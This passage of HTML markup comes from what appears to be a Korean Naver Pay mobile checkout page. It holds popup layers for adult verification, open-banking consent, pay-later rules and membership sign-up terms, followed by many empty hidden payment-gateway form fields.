							<div class="desc_text">
								<p>동일 상품의 상품리뷰 적립은 1회로 제한됩니다.</p>
							</div>
						</script>
						
						<script type="text/template" class="_tpl_review_benefit_guide_c2">
							<div class="desc_text">
								<p>동일 상품의 상품리뷰/한달사용리뷰 적립은 각각 1회로 제한됩니다.</p>
							</div>
						</script>
						
						<div class="ly_bx _layer_adult_authentication" style="display:none">
							<div class="ly_cont adult_certify _adultAuthentication">
								<strong class="pop_tit">알려드립니다.</strong>
								<p class="pop_text">주류 상품 구매 시 관계법령에 따라
									개인정보 제공 동의 및 <span class="point_red">19세 이상 본인인증</span>을
									거쳐야 구매하실 수 있습니다.</p>
								<div class="pop_btnarea">
									<button type="button" class="npay_common_button type_green_sec size_popup _click(checkout.mobile.order.order_sheet.openAdultAuthenticationPopup(MOBILE)) _stopDefault">휴대폰 인증</button>
									<button type="button" class="npay_common_button type_green_sec size_popup _click(checkout.mobile.order.order_sheet.openAdultAuthenticationPopup(IPIN)) _stopDefault">아이핀 인증</button>
									<button type="button" class="npay_common_button type_basic size_popup _click(checkout.mobile.order.order_sheet.hideAdultAuthenticationLayer()) _stopDefault">취소</button>
								</div>
							</div>
						</div>
						
						<div class="dimlayer _openBankingAgreeLayer" style="display:none">
							<div class="dimbg"></div>
							<div class="bottom_floating promotion_layer">
								<strong class="popup_title">오픈뱅킹 이용 약관 동의</strong>
								<div class="openbanking_area">
									<div class="desc">
										<b class="title">오픈뱅킹이란?</b>
										<p>은행 및 증권사 간에 송금, 결제 등의 금융 서비스를 개방하여 제공하는 표준화된 금융시스템입니다.</p>
									</div>
									<div class="agree">
										<ul class="list">
											<li><a href="#" class="_click(checkout.mobile.order.order_sheet.openPopupOpenBankingAgreeInfoPage(TRANSFER)) _stopDefault openbanking_img">(필수) 오픈뱅킹 참여 금융사 이용 약관</a></li>
											<li><a href="#" class="_click(checkout.mobile.order.order_sheet.openPopupOpenBankingAgreeInfoPage(PRIVATE_OFFER)) _stopDefault openbanking_img">(필수) 금융결제원 개인정보 제공 동의</a></li>
										</ul>
									</div>
									<div class="notify">
										<b>은행 또는 증권사로부터 문자 메시지를 받더라도 놀라지마세요!</b>
										<ul class="bullet_list">
											<li class="bullet_item">오픈뱅킹 시스템에 계좌가 잘 등록됐다는 안내이며 간편결제 계좌를 여러 개 등록하셨다면 계좌마다 문자 메시지를 받으실 수도 있습니다.</li>
											<li class="bullet_item">이미 출금이체 동의하셨던 간편결제 계좌에서 출금(결제, 송금, 충전 등) 시 오픈뱅킹이 사용될 수 있습니다.</li>
											<li class="bullet_item">고객님의 요청 없이 출금/이체되지 않으니 안심하고 이용해주세요.</li>
										</ul>
									</div>
								</div>
								<div class="bottom_button">
									<button type="button" class="_click(checkout.mobile.order.order_sheet.agreeUsingOpenBanking()) _stopDefault npay_common_button">동의 후 계속하기</button>
								</div>
								<button type="button" class="_click(checkout.mobile.order.order_sheet.closeOpenBankingAgreeLayer()) _stopDefault button_close openbanking_img"><span class="blind">레이어닫기</span></button>
							</div>
						</div>
						
						<script type="text/template" class="_tpl_select_charge_bank">
							<div class="dimlayer _chargeBankLayer" style="display:none;">
								<div class="dimbg"></div>
								<div class="bottom_floating pointcharge_layer">
									<strong class="popup_title">출금계좌</strong>
									<ul class="account_list">
												<li class="account none">
													등록된 계좌가 없습니다.<br>계좌를 추가해 주세요.
												</li>
									</ul>
									<button type="button" class="N=a:ode.chargepointaccountadd button_add _click(checkout.mobile.order.order_sheet.registerEasyBank()) _stopDefault">계좌 추가</button>
									<button type="button" class="button_close openbanking_img _click(checkout.mobile.order.order_sheet.hideModalLayer(chargeBankLayer)) _stopDefault"><span class="blind">레이어닫기</span></button>
								</div>
							</div>
						</script>
						
						<div class="ly_bx _layer_chargePoint_locked" style="display:none; top: 1960px;">
							<div class="ly_cont no_payment">
								<p class="pop_text">포인트 사용 등으로<br> 남은 결제금액이 <strong class="no_payment_point">0원</strong>입니다.</p>
								<div class="pop_btnarea">
									<button type="button" class="npay_common_button type_basic size_popup _click(checkout.mobile.order.order_sheet.hidDimmedLayer(layer_chargePoint_locked)) _stopDefault">확인</button>
								</div>
							</div>
						</div>
						
						<!-- 후불결제 팝업 -->
						<!-- 후불결제 사용불가 ( 포인트 > 주문금액 ) 케이스 클릭시 -->
						<div class="ly_bx no_payment _pointOfPayLaterLayer" style="display: none">
							<div class="ly_cont no_payment">
								<strong class="no_payment_title">금융위원회 정책에 따라<br>갖고 있는 포인트를 모두 사용해야<br>후불결제를 이용할 수 있어요.</strong>
								<div class="pop_btnarea">
									<button type="button" class="npay_common_button type_basic size_popup _click(checkout.mobile.order.order_sheet.hidePayLaterLayer(point)) _stopDefault">확인</button>
								</div>
							</div>
						</div>
						<!-- 후불결제: 나중에 결제 딤드시 -->
						<div class="ly_bx _payNextOfPayLaterLayer" style="display: none">
							<div class="ly_cont charge">
								<p class="pop_text text_gray">후불결제 이용 시<br>'나중에 결제'를 이용하실 수 없습니다.</p>
								<div class="pop_btnarea">
									<button type="button" class="npay_common_button type_basic size_popup _click(checkout.mobile.order.order_sheet.hidePayLaterLayer(payNext)) _stopDefault">확인</button>
								</div>
							</div>
						</div>
						
						<div class="wrap_layer _newCandidateUserPayLaterWrapLayer" style="display: none">
							<div class="layer_content layer_paylater _newCandidateUserPayLaterLayer">
								<em class="pop_name">네이버페이 후불결제</em>
								<strong class="pop_tit">지금 구매하고<br>다음에 납부하세요!</strong>
								<ul class="check_list">
									<li>최대 <span class="pop_highlight">30만원</span>까지 사용 가능</li>
								</ul>
								<button type="button" class="button_round _click(checkout.mobile.order.order_sheet.goPayLaterSignup()) _stopDefault"><b>30초</b>만에 신청하고 <b>바로 사용</b></button>
								<button type="button" class="btn_popclose _click(checkout.mobile.order.order_sheet.hideNewCandidateUserPayLaterLayer()) _stopDefault"><span class="blind">팝업닫기</span></button>
							</div>
						</div>
						
						<div class="wrap_layer _tutorialPayLaterWrapLayer" style="display: none">
							<div class="layer_content layer_paylater_tutorial _tutorialPayLaterLayer">
								<strong class="pop_tit">
									이제 <span class="point_color_green">후불결제</span>를 사용할 수 있어요!<br>
									<span class="pop_highlight">2가지</span>만 기억하세요.
								</strong>
								<ul class="tutorial_list">
									<li class="item">
										<strong class="number">하나!</strong>
										<strong class="item_title first">보유포인트를<br>모두 사용해야<br>후불결제 이용이 가능해요!</strong>
										<p class="item_desc">후불결제는 금융위원회 정책에 따라 주문 시 보유포인트를 모두 사용해야 이용할 수 있어요. 보유포인트가 주문금액보다 많으면 후불결제 이용이 어려워요.</p>
									</li>
									<li class="item">
										<strong class="number">둘!</strong>
										<strong class="item_title second">이용한 금액은<br>선택하신 납부일에<br>자동으로 출금 돼요.</strong>
										<p class="item_desc">오늘 결제금액은 0원! 납부일 전에 계좌 잔액을 확인해주세요. 이용현황 및 청구서는 네이버페이&gt;홈, 내자산에서 ‘후불결제’를 눌러 언제든지 확인할 수 있어요.</p>
									</li>
								</ul>
								<button type="button" class="btn_ok _click(checkout.mobile.order.order_sheet.hideTutorialPayLaterLayer()) _stopDefault">확인</button>
							</div>
						</div>
						
						<div class="ly_bx no_payment _layer_no_payment" style="display:none;">
							<div class="ly_cont no_payment">
								<strong class="no_payment_title">더 이상 결제할 금액이 없습니다.</strong>
								<p class="no_payment_description">
									다른 결제수단을 이용하시려면<br>포인트 사용 금액을 변경하거나<br>후불결제 선택을 해제해 주세요.</p>
								<div class="pop_btnarea">
									<button type="button" class="npay_common_button type_basic size_popup _click(checkout.mobile.order.order_sheet.hidDimmedLayer(layer_no_payment)) _stopDefault">확인</button>
								</div>
							</div>
						</div>
						
						<div class="ly_bx no_payment _usePointAllBeforePayLaterWrapLayer" style="display: none">
							<div class="ly_cont no_payment _usePointAllBeforePayLaterLayer">
								<strong class="no_payment_title">보유포인트가 모두 사용됩니다.</strong>
								<div class="point_box">
									<span class="point_notice">보유포인트 전액사용</span>
									<span class="amount">0원</span>
								</div>
								<p class="available_point_text">금융위원회 정책에 따라<br>갖고 있는 포인트를 모두 사용해야<br>후불결제를 이용할 수 있어요.</p>
								<div class="pop_btnarea type_two">
									<button type="button" class="npay_common_button _click(checkout.mobile.order.order_sheet.hideLayerAndNoUsePayLater()) _stopDefault">취소</button><button type="button" class="npay_common_button type_green _click(checkout.mobile.order.order_sheet.hideLayerAndUsePayLater()) _stopDefault">계속</button>
								</div>
							</div>
						</div>
						
						<div class="ly_bx no_payment _unableMinChargePointWrapLayer" style="display:none">
							<div class="ly_cont no_payment _unableMinChargePointLayer">
								<strong class="no_payment_title">충전 가능 금액이 부족하여<br>충전결제 이용이 불가합니다.</strong>
								<p class="available_point_text">최소 1만원부터 충전 가능합니다.<br>(현재 충전 가능 금액 : <span class="no_payment_point"><dummy class="_amount">-</dummy>원</span>)</p>
								<div class="pop_btnarea">
									<button type="button" class="npay_common_button _click(checkout.mobile.order.order_sheet.hideUnableMinChargePointLayer()) _stopDefault">확인</button>
								</div>
							</div>
						</div>
						<div class="ly_bx no_payment _remainAmountUsingChargePointWrapLayer" style="display:none">
							<div class="ly_cont no_payment _remainAmountUsingChargePointLayer">
								<strong class="no_payment_title">충전한도가 부족하여<br>다른 결제수단이 추가 선택됩니다.</strong>
								<div class="point_box">
									<span class="point_notice">내 충전한도</span>
									<span class="amount"><dummy class="_amount">-</dummy>원</span>
								</div>
								<p class="available_charge_text">
									선불전자지급수단 정책에 의해<br>
									포인트는 200만원 한도 안에서 충전할 수 있어요.<br>
									(보유포인트 + 충전금액 = 최대 200만원)
								</p>
								<div class="pop_btnarea">
									<button type="button" class="npay_common_button _click(checkout.mobile.order.order_sheet.showChargePointMultiSelectTooltip()) _stopDefault">확인</button>
								</div>
							</div>
						</div>
						
						<div class="ly_bx no_payment _remainAmountWhenPaymentBtnWrapLayer" style="display:none">
							<div class="ly_cont no_payment _remainAmountWhenPaymentBtnLayer">
								<strong class="no_payment_title">남은 결제금액이 있어<br>결제수단이 추가 선택됩니다.</strong>
								<div class="pop_btnarea">
									<button type="button" class="npay_common_button _click(checkout.mobile.order.order_sheet.showChargePointMultiSelectTooltip()) _stopDefault">확인</button>
								</div>
							</div>
						</div>
						
						
						<div class="ly_bx no_payment _unableChargepointWithPaylaterWrapLayer" style="display:none">
							<div class="ly_cont no_payment _unableChargepointWithPaylaterLayer">
								<strong class="no_payment_title">후불결제 사용 시<br>충전결제 이용이 불가합니다.</strong>
								<div class="pop_btnarea">
									<button type="button" class="npay_common_button _click(checkout.mobile.order.order_sheet.hideUnableChargepointWithPaylater()) _stopDefault">확인</button>
								</div>
							</div>
						</div>
						
						<div class="_membership_quick_join_layer dimlayer" style="display: none">
							<div class="dimbg"></div>
							<div class="_membership_quick_join_contants_layer bottom_floating membership">
								<div class="membership_layer">
									<div class="title_area">
										<div class="sub_text"><span class="member_icon"><span class="blind">네이버페이 플러스 멤버십</span></span>고객님께만 드리는 깜짝선물</div>
										<div class="title_box">
											<strong class="membership_title"><span class="blind">네이버 멤버십 무료 이용권이 지급되었습니다!</span></strong>
											<p class="description">멤버십 무료이용권은 본 팝업에서<br>멤버십 시작 시 지급됩니다.</p>
											<div class="title_img_box">
												<img src="//img.pay.naver.net/o/mstatic/img/service/mobile/order/img_membership_layer1.png" alt="최대 5%" class="img_agree">
												<span class="img_desc">20만원까지 4%,기본적립 1%</span>
											</div>
										</div>
									</div>
									<div class="content_area">
										<input type="checkbox" id="chk1" class="_membership_quick_join_first_btn button check_circle _click(checkout.mobile.order.order_sheet._selectAllMembershipQuickJoinInputs())">
										<label for="chk1" class="agree_all">모두 동의합니다. <span class="sub">(선택 정보 포함)</span></label>
										<ul class="agree_list">
											<li>
												<input type="checkbox" id="chk2" class="_membership_quick_join_second_btn button check_sub _click(checkout.mobile.order.order_sheet._checkAllMembershipQuickJoinInputs())">
												<!--
													[d] .btn_fold 클릭시 .btn_fold에 .on / .detail_box에 .on 추가 부탁드립니다.
													aria-label="닫기" 로 수정 부탁드립니다.
												-->
												<label for="chk2" class="agree_sub">
													(필수) <a href="https://nid.naver.com/user2/common/terms/terms.nhn?m=viewMembershipTermOfUse" target="_blank" class="link">이용약관</a> 및
													<button type="button" id="membershipQuickJoinFoldBtn" class="_click(checkout.mobile.order.order_sheet._clickMembershipQuickJoinFoldBtn()) _membership_quick_join_fold_btn btn_fold" aria-label="열기">결제 및 멤버십 유의사항</button>에 동의합니다.
												</label>
												<div id="membershipQuickJoinAgreementLayer" class="_membership_quick_join_agreement_layer detail_box">
													<strong class="title">결제 유의사항</strong>
													<ul class="detail_list">
														<li>결제주기 (매월,12개월 등)마다 최초 가입하신 일자에 정기결제가 발생합니다. 동일한 일자가 없는 달은 말일에 결제됩니다.</li>
														<li>가장 마지막으로 네이버플러스 멤버십 및 업그레이드 상품을 구매하실 때 지정하신 결제 수단으로 네이버플러스 멤버십과 업그레이드 상품이 정기결제됩니다.</li>
														<li><b>멤버십 회원이 이용료 결제 후 디지털 서비스 이용권으로 콘텐츠를 열람하는 등 디지털 콘텐츠 서비스를 이용한 경우에는 해당 회차에 대하여 청약철회, 해지 및 환불이 불가능합니다.</b></li>
														<li><b>네이버플러스 멤버십 이용료 결제일의 익일부터 7일 이내에, 네이버페이 포인트 적립 서비스를 제외한 어떠한 혜택도 사용하지 않은 경우에 한하여, 청약철회가 가능합니다. (예를 들어, 1월 1일 결제한 경우, 1월 8일까지 청약철회 가능)</b></li>
														<li><b>청약철회 기간이 경과한 후에도 멤버십 회원이 (i) 어떠한 디지털 서비스 이용권도 선택하지 아니하였거나 (ii) 선택한 디지털 서비스 이용권을 이용하지 아니한 경우에는 이용 기간 내에 해지가 가능하며, 마지막으로 결제한 이용료에서 위약금 10%를 공제한 90%가 환불됩니다.</b></li>
														<li>연간 단위의 상품은 1년의 가입을 유지하는 조건으로 할인 가격에 제공됩니다. 1년이 경과하기 전에 구독을 중도 해지하면 정상가(58,800원, 월 4,900원)을 기준으로 사용한 금액을 공제하고 환불됩니다.</li>
														<li>환불 시, 멤버십 적립 포인트는 환불 시점에 회수되며 적립 예정 멤버십 적립 포인트는 환불 이후 적립되지 않습니다.</li>
														<li>미성년자가 법정대리인 동의 없이 계약을 체결한 경우, 미성년자 본인 또는 법정대리인이 이를 취소할 수 있습니다.</li>
													</ul>
													<strong class="title">가입 유의사항</strong>
													<ul class="detail_list">
														<li>네이버플러스 멤버십 가입은 실명 인증된 네이버 ID 1개에서만 이용이 가능하며, 동시에 2개 이상의 ID에서 중복 사용이 제한됩니다.</li>
														<li>네이버플러스 멤버십의 무료 체험 프로모션은 실명을 기준으로 1회만 적용 가능하며, 중도 해지하여 환불 받으신 경우에도 다시 적용되지 않습니다.</li>
														<li>네이버플러스 멤버십의 모든 혜택은 네이버 및 각 서비스 제공사들의 사정에 따라 변경될 수 있습니다.</li>
														<li>각 디지털 콘텐츠 서비스에서 자체적으로 발생한 문제에 대해서는 네이버플러스 멤버십에서 책임지지 않습니다.</li>
														<li>징계, 탈퇴 등 각 서비스에서 정한 정책 기준에 따라 특정 네이버플러스 멤버십 혜택을 이용하시지 못하는 경우가 발생할 수 있습니다.</li>
														<li>디지털 서비스 이용권 및 업그레이드 상품은 선택 후 해당 네이버플러스 멤버십 기간 중 변경 및 철회가 불가능합니다.</li>
													</ul>
												</div>
											</li>
											<li>
												<input type="checkbox" id="chk3" class="_membership_quick_join_third_btn button check_sub _click(checkout.mobile.order.order_sheet._checkAllMembershipQuickJoinInputs())">
												<label for="chk3" class="agree_sub">(필수) <a href="https://nid.naver.com/user2/common/terms/terms.nhn?m=viewMembership3rd" target="_blank" class="link">네이버-제휴사 간 개인정보 제공</a>에 동의합니다.</label>
											</li>
											<li>
												<input type="checkbox" id="chk4" class="_membership_quick_join_fourth_btn button check_sub _click(checkout.mobile.order.order_sheet._checkAllMembershipQuickJoinInputs())">
												<label for="chk4" class="agree_sub">(필수) <a href="https://nid.naver.com/user2/common/terms/terms.nhn?m=viewMembership3rdToNaver" target="_blank" class="link">제휴사-네이버 간 개인정보 제공</a>에 동의합니다.</label>
											</li>
											<li>
												<input type="checkbox" id="chk5" class="_membership_quick_join_fifth_btn button check_sub _click(checkout.mobile.order.order_sheet._checkAllMembershipQuickJoinInputs())">
												<label for="chk5" class="agree_sub">(선택) 광고성 정보 수신에 동의합니다.</label>
											</li>
										</ul>
										<button type="button" class="N=a:ode.membershiplinebannerbutton _membership_quick_join_confirm_btn button button_bottom type_membership _click(checkout.mobile.order.order_sheet._clickMembershipQuickJoinBtn()) _stopDefault" disabled="disabled">지금 시작하고 포인트 받기</button><!--N=a:ode.membershiplinebannerbutton-->
									</div>
								</div>
								<button type="button" class="_membership_quick_join_close_btn button_close _click(checkout.mobile.order.order_sheet._closeMembershipQuickJoin()) _stopDefault"><span class="blind">레이어닫기</span></button>
							</div>
						</div>
						
						<div class="_membership_quick_join_confirmed_layer dimlayer" style="display: none">
							<div class="dimbg"></div>
							<div class="bottom_floating membership">
								<div class="membership_layer start">
									<div class="title_area">
										<div class="sub_text"><span class="member_icon"><span class="blind">네이버페이 플러스 멤버십</span></span>고객님께만 드리는 깜짝선물</div>
										<div class="title_box">
											<strong class="membership_title"><span class="blind">네이버 멤버십 강력한 혜택이 시작 되었어요!</span></strong>
											<div class="line"></div>
											<p class="description">멤버십 혜택 기간 <span class="_membership_quick_join_duration point">09.05.~10.04.</span></p>
											<div class="title_img_box">
												<img src="//img.pay.naver.net/o/mstatic/img/service/mobile/order/img_membership_layer2.png" alt="쇼핑할 때마다 5% 최대 적립" class="img_agree">
											</div>
										</div>
									</div>
									<div class="content_area">
										<p class="text">
											멤버십이 드리는 강력한 혜택!<br>
											<strong class="point">5% 쇼핑 적립</strong>과 <strong class="point">다양한 디지털 콘텐츠</strong>로<br>
											똑똑한 쇼핑 라이프를<br>
											누려 보세요.
										</p>
										<button type="button" class="button_bottom type_green _click(checkout.mobile.order.order_sheet._closeMembershipQuickConfirmedJoin())">계속 쇼핑하기</button>
									</div>
								</div>
								<button type="button" class="button_close _click(checkout.mobile.order.order_sheet._closeMembershipQuickConfirmedJoin())"><span class="blind">레이어닫기</span></button>
							</div>
						</div>
						
						
						 
						
							<input type="hidden" name="tempOrderId" id="tempOrderId" class="_tempOrderId" value="">
							<input type="hidden" name="reserveSeq" value="6262803928">
							 <input type="hidden" name="approvalSeq">
							 <input type="hidden" name="pgId">
							 <input type="hidden" name="payMeansClass">
							 <input type="hidden" name="accountNo">
							 <input type="hidden" name="endDate">
							 <input type="hidden" name="payAmt">
							 <input type="hidden" name="authKey">
							 <input type="hidden" name="pinNo">
							 <input type="hidden" name="pinNoConfirm">
							 <input type="hidden" name="isPin">
							 <input type="hidden" name="isPinPayMember">
							 <input type="hidden" name="mobileOperator">
							 <input type="hidden" name="phoneNo">
							 <input type="hidden" name="prvsnurl">
							 <input type="hidden" name="cinf">
							 <input type="hidden" name="mobilePayActionType">
							 <input type="hidden" name="fdsUuid">
							 <input type="hidden" name="authentificationToken">
							 <input type="hidden" name="naverToken">
							 <input type="hidden" name="fingerPrintResultCode">
							<input type="hidden" name="usePointAllYn">
							<input type="hidden" name="pointChargeCorpCd">
							<input type="hidden" name="pointChargeCorpKey">
							<input type="hidden" name="pointChargeAmount">
							<input type="hidden" name="useChargePointYn">
							<input type="hidden" name="usePayLaterYn">
							<input type="hidden" name="usePayLaterAllYn">
							<input type="hidden" name="addedPickupLocationYn">
							<input type="hidden" name="alwaysUsePickupLocationYn">
							<input type="hidden" name="refundAccountKey">
						
						 <!-- pg사별 Form -->
							  
							 
								<input type="hidden" name="RSVSEQ" value="">
							<input type="hidden" name="SVCINF" value="">
							<input type="hidden" name="SID" value="">
							<input type="hidden" name="CHNL" value="">
							<input type="hidden" name="USERID" value="">
							<input type="hidden" name="USERKEY" value="">
							<input type="hidden" name="EMAIL" value="">
							<input type="hidden" name="MOBILENO" value="">
							<input type="hidden" name="AMT" value="">
							<input type="hidden" name="CPID" value="">
							<input type="hidden" name="ITEMID" value="">
							<input type="hidden" name="TITLE" value="">
							<input type="hidden" name="PGID" value="">
							<input type="hidden" name="CORPCD" value="">
							<input type="hidden" name="CKEY" value="">
							<input type="hidden" name="PAYNO" value="">
							<input type="hidden" name="VALIDYM">
							<input type="hidden" name="ALLOT">
							<input type="hidden" name="PASSWD">
							<input type="hidden" name="RSVNO" value="">
							<input type="hidden" name="RESNO">
							<input type="hidden" name="INSTMO" value="">
							<input type="hidden" name="NOINTEREST" value="">
							<input type="hidden" name="NOINTERESTTYPE" value="01">
							<input type="hidden" name="POINTFG" value="">
							<input type="hidden" name="PERSON" value="">
							<input type="hidden" name="SPLITPARAM" value="">
							<input type="hidden" name="SPLITYN" value="">
							<input type="hidden" name="CLIENTSEQ" value="">
							
							<input type="hidden" name="MSG" value="">
							<input type="hidden" name="APPROVALSEQ" value="">
							<input type="hidden" name="ACCTNO" value="">
							<input type="hidden" name="ENDDATE" value="">
							<input type="hidden" name="BALANCE" value="">
							<input type="hidden" name="AUTHTYPE" value="">
							
							<input type="hidden" name="NOINTSELLERYN" value="">
							<input type="hidden" name="SURL" value="">
							<input type="hidden" name="RURL" value="">
							<input type="hidden" name="CURL" value="">
							<input type="hidden" name="LBF" id="LBF" value="">
							<input type="hidden" name="MACRURL" value="">
							<input type="hidden" name="EXPDATE" value="">
							
							<input type="hidden" name="ISSKNORMALUSER" value="Y">
							<input type="hidden" name="PREIFRAME" value="">
							<input type="hidden" name="POSTIFRAME" value="">
							<input type="hidden" name="ANSIMFG" value="">
							<input type="hidden" name="SAFEFG" value="">
							<input type="hidden" name="AUTHNO" value="">
							<input type="hidden" name="PAYKEY" value="">
							<input type="hidden" name="IFRAMETYPE" value="">
							<input type="hidden" name="PGFORMNAME" value="">
							<input type="hidden" name="CHARSET" value="">
							<input type="hidden" name="CLOSEURL" value="">
							<input type="hidden" name="LOSTPWCHANGEFG" value="">
							<input type="hidden" name="JOINSTATUS" value="">
							
							<input type="hidden" name="PKGEVD" value="">
							<input type="hidden" name="TAXATIONAMT" value="">
							<input type="hidden" name="EXEMPTIONAMT" value="">
							<input type="hidden" name="USEPENDING" value="">
						
							<input type="hidden" name="mid_common" value="">
							<input type="hidden" name="mid_point" value="">
							<input type="hidden" name="ACCTKEY" value="">
							
						
						
							  
							 
								<input type="hidden" name="RSVSEQ" value="">
							<input type="hidden" name="SVCINF" value="">
							<input type="hidden" name="SID" value="">
							<input type="hidden" name="CHNL" value="">
							<input type="hidden" name="USERID" value="">
							<input type="hidden" name="USERKEY" value="">
							<input type="hidden" name="EMAIL" value="">
							<input type="hidden" name="MOBILENO" value="">
							<input type="hidden" name="AMT" value="">
							<input type="hidden" name="CPID" value="">
							<input type="hidden" name="ITEMID" value="">
							<input type="hidden" name="TITLE" value="">
							<input type="hidden" name="PGID" value="">
							<input type="hidden" name="CORPCD" value="">
							<input type="hidden" name="CKEY" value="">
							<input type="hidden" name="PAYNO" value="">
							<input type="hidden" name="VALIDYM">
							<input type="hidden" name="ALLOT">
							<input type="hidden" name="PASSWD">
							<input type="hidden" name="RSVNO" value="">
							<input type="hidden" name="RESNO">
							<input type="hidden" name="INSTMO" value="">
							<input type="hidden" name="NOINTEREST" value="">
							<input type="hidden" name="NOINTERESTTYPE" value="01">
							<input type="hidden" name="POINTFG" value="">
							<input type="hidden" name="PERSON" value="">
							<input type="hidden" name="SPLITPARAM" value="">
							<input type="hidden" name="SPLITYN" value="">
							<input type="hidden" name="CLIENTSEQ" value="">
							
							<input type="hidden" name="MSG" value="">
							<input type="hidden" name="APPROVALSEQ" value="">
							<input type="hidden" name="ACCTNO" value="">
							<input type="hidden" name="ENDDATE" value="">
							<input type="hidden" name="BALANCE" value="">
							<input type="hidden" name="AUTHTYPE" value="">
							
							<input type="hidden" name="NOINTSELLERYN" value="">
							<input type="hidden" name="SURL" value="">
							<input type="hidden" name="RURL" value="">
							<input type="hidden" name="CURL" value="">
							<input type="hidden" name="LBF" id="LBF" value="">
							<input type="hidden" name="MACRURL" value="">
							<input type="hidden" name="EXPDATE" value="">
							
							<input type="hidden" name="ISSKNORMALUSER" value="Y">
							<input type="hidden" name="PREIFRAME" value="">
							<input type="hidden" name="POSTIFRAME" value="">
							<input type="hidden" name="ANSIMFG" value="">
							<input type="hidden" name="SAFEFG" value="">
							<input type="hidden" name="AUTHNO" value="">
							<input type="hidden" name="PAYKEY" value="">
							<input type="hidden" name="IFRAMETYPE" value="">
							<input type="hidden" name="PGFORMNAME" value="">
							<input type="hidden" name="CHARSET" value="">
							<input type="hidden" name="CLOSEURL" value="">
							<input type="hidden" name="LOSTPWCHANGEFG" value="">
							<input type="hidden" name="JOINSTATUS" value="">
							
							<input type="hidden" name="PKGEVD" value="">
							<input type="hidden" name="TAXATIONAMT" value="">
							<input type="hidden" name="EXEMPTIONAMT" value="">
							<input type="hidden" name="USEPENDING" value="">
						
							<input type="hidden" name="mid_common" value="naver_smartstore05">
							<input type="hidden" name="mid_point" value="naver_smartstore05">
							
							<input type="hidden" name="OC_MID" id="OC_MID" value="">
							<input type="hidden" name="OC_CARDTYPE" id="OC_CARDTYPE" value="">
							<input type="hidden" name="OC_POINTUSE" id="OC_POINTUSE" value="N">
							<input type="hidden" name="OC_NOINT_NDISP" id="OC_NOINT_NDISP" value="">
							<input type="hidden" name="OC_NOINT" id="OC_NOINT" value="">
							<input type="hidden" name="OC_INSTMO" id="OC_INSTMO" value="">
							
							<input type="hidden" name="OC_REGTYPE" id="OC_REGTYPE" value="">
							<input type="hidden" name="OC_REGFRAME" id="OC_REGFRAME" value="approval_frame_51A">
							<input type="hidden" name="IFRAME_NAME" value="">
						
						
							  
							 
								<input type="hidden" name="RSVSEQ" value="">
							<input type="hidden" name="SVCINF" value="">
							<input type="hidden" name="SID" value="">
							<input type="hidden" name="CHNL" value="">
							<input type="hidden" name="USERID" value="">
							<input type="hidden" name="USERKEY" value="">
							<input type="hidden" name="EMAIL" value="">
							<input type="hidden" name="MOBILENO" value="">
							<input type="hidden" name="AMT" value="">
							<input type="hidden" name="CPID" value="">
							<input type="hidden" name="ITEMID" value="">
							<input type="hidden" name="TITLE" value="">
							<input type="hidden" name="PGID" value="">
							<input type="hidden" name="CORPCD" value="">
							<input type="hidden" name="CKEY" value="">
							<input type="hidden" name="PAYNO" value="">
							<input type="hidden" name="VALIDYM">
							<input type="hidden" name="ALLOT">
							<input type="hidden" name="PASSWD">
							<input type="hidden" name="RSVNO" value="">
							<input type="hidden" name="RESNO">
							<input type="hidden" name="INSTMO" value="">
							<input type="hidden" name="NOINTEREST" value="">
							<input type="hidden" name="NOINTERESTTYPE" value="01">
							<input type="hidden" name="POINTFG" value="">
							<input type="hidden" name="PERSON" value="">
							<input type="hidden" name="SPLITPARAM" value="">
							<input type="hidden" name="SPLITYN" value="">
							<input type="hidden" name="CLIENTSEQ" value="">
							
							<input type="hidden" name="MSG" value="">
							<input type="hidden" name="APPROVALSEQ" value="">
							<input type="hidden" name="ACCTNO" value="">
							<input type="hidden" name="ENDDATE" value="">
							<input type="hidden" name="BALANCE" value="">
							<input type="hidden" name="AUTHTYPE" value="">
							
							<input type="hidden" name="NOINTSELLERYN" value="">
							<input type="hidden" name="SURL" value="">
							<input type="hidden" name="RURL" value="">
							<input type="hidden" name="CURL" value="">
							<input type="hidden" name="LBF" id="LBF" value="">
							<input type="hidden" name="MACRURL" value="">
							<input type="hidden" name="EXPDATE" value="">
							
							<input type="hidden" name="ISSKNORMALUSER" value="Y">
							<input type="hidden" name="PREIFRAME" value="">
							<input type="hidden" name="POSTIFRAME" value="">
							<input type="hidden" name="ANSIMFG" value="">
							<input type="hidden" name="SAFEFG" value="">
							<input type="hidden" name="AUTHNO" value="">
							<input type="hidden" name="PAYKEY" value="">
							<input type="hidden" name="IFRAMETYPE" value="">
							<input type="hidden" name="PGFORMNAME" value="">
							<input type="hidden" name="CHARSET" value="">
							<input type="hidden" name="CLOSEURL" value="">
							<input type="hidden" name="LOSTPWCHANGEFG" value="">
							<input type="hidden" name="JOINSTATUS" value="">
							
							<input type="hidden" name="PKGEVD" value="">
							<input type="hidden" name="TAXATIONAMT" value="">
							<input type="hidden" name="EXEMPTIONAMT" value="">
							<input type="hidden" name="USEPENDING" value="">
							<input type="hidden" name="PGCP" value="60A">
							<input type="hidden" name="CP_UI" value="">
							<input type="hidden" name="CASH_GB" value="MC">
							<input type="hidden" name="Prdtnm" value="">
							<input type="hidden" name="Prdtprice" value="">
							<input type="hidden" name="Siteurl" value="">
							<input type="hidden" name="Tradeid" value="">
							<input type="hidden" name="MC_SVCID" value="">
							<input type="hidden" name="smobileSid" value="">
							<input type="hidden" name="Okurl" value="">
							<input type="hidden" name="Failurl" value="">
							<input type="hidden" name="MC_No" value="">
							<input type="hidden" name="Cryptstring" value="">
							<input type="hidden" name="mUserKey" value="">
							<input type="hidden" name="Closeurl" value="">
							<input type="hidden" name="phoneId" value="">
							<input type="hidden" name="PAY_MODE" value="">
							<input type="hidden" name="LOGO_YN" value="">
							<input type="hidden" name="CALL_TYPE" value="">
							<input type="hidden" name="MC_FIXNO" value="">
							<input type="hidden" name="IFRAME_NAME" value="">
							<input type="hidden" name="Cryptyn" value="">
							<input type="hidden" name="EMAIL_HIDDEN" value="Y">
							<input type="hidden" name="Payeremail" value="">
							<input type="hidden" name="Userid" value="">
							<input type="hidden" name="Item" value="">
							<input type="hidden" name="Prdtcd" value="">
							<input type="hidden" name="MSTR" value="">
							<input type="hidden" name="MC_JOIN_TYPE" value="J">
							<input type="hidden" name="JOIN_STATUS" value="N">
							
							<input type="hidden" name="SocialNo" value="">
							<input type="hidden" name="authType" value="">
							<input type="hidden" name="Mobilid" value="">
							<input type="hidden" name="ansimFlag" value="">
							<input type="hidden" name="safeguard" value="">
						
								   
